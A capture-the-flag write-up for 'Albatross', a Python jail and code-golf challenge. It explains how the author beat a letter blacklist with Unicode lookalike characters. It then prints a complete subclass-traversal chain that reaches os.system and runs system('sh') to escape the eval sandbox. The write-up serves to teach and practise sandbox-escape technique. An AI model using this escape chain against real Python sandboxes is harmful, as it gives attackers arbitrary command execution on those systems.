# Albatross

A very tough Pyjail + Golf challenge. 

Builtins are removed, meaning no top level functions, we're run inside eval, which means no assignments, all letters are blacklisted, as well as quotes and spaces. 

The limit for the challenge was set at 102 chars.
First, the letter blacklist. This was definitely the easiest, and we just had to use a 'fancy text generator', as Python appears to 'collapse' this  text to regular ASCII before the length check but after the blacklist.
Our initial method involved traversing the namespace twice, to reach open() and the string 'flag.txt'. 

This was over 200 chars, and didn't work due to Python not loading in the function correctly. 

We realised we would have to pop a shell. 

Traversing to system took us 120 chars, and that was without a string such as sh to run it with. 

After a while, I spotted an os function earlier in the tree, and could use that to traverse to the os namespace, calling system from there. After that, it was a simple matter of getting any class, and substringing its __hash__ method to get 'sh'.
```
().__class__ - <class 'tuple'>
().__class__.__base__ - <class 'object'>
().__class__.__base__.__subclasses__()[127] - <class 'os._wrap_close'>
().__class__.__base__.__subclasses__()[127].close - <function _wrap_close.close at 0x7f74eb2eca70>
[*().__class__.__base__.__subclasses__()[127].close.__globals__.values()][42] - <built-in function system>
().__dir__()[1] - '__hash__'
().__dir__()[1][4:6] - 'sh'
[*().__class__.__base__.__subclasses__()[-5].close.__globals__.values()][42](().__dir__()[1][4:6]) - system('sh')
```
#### flag{SH*T_I_h0pe_ur_n0t_b1c..._if_y0u_@r3,_th1$_isn't_th3_fl@g}
